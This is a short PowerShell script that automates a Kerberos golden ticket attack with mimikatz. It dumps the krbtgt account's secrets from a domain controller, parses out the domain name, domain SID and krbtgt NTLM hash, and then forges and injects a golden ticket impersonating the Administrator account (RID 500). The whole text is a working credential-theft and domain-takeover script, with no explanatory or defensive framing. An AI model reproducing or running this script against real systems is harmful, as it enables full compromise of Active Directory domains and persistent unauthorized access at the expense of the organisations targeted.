cd C:\Users\Administrator\Downloads #path to mimikatz
$(
	.\mimikatz.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit #get the needed data
) *>&1 > output.txt

#split the data in variables
$tdomain = Get-Content .\output.txt | findstr Domain | %{ $_.Split(' ')[2] ; }
$tdomain = $tdomain + '.local'
$sid = Get-Content .\output.txt | findstr Domain | %{ $_.Split(' ')[4] ; }
$ntlm = Get-Content .\output.txt | findstr NTLM|Select-Object -first 1 | %{ $_.Split(':')[1] ; } | %{ $_.Split(' ')[1] ; }

.\mimikatz.exe privilege::debug "kerberos::golden /domain:$tdomain /sid:$sid /rc4:$ntlm /user:Administrator /id:500 /ptt" exit
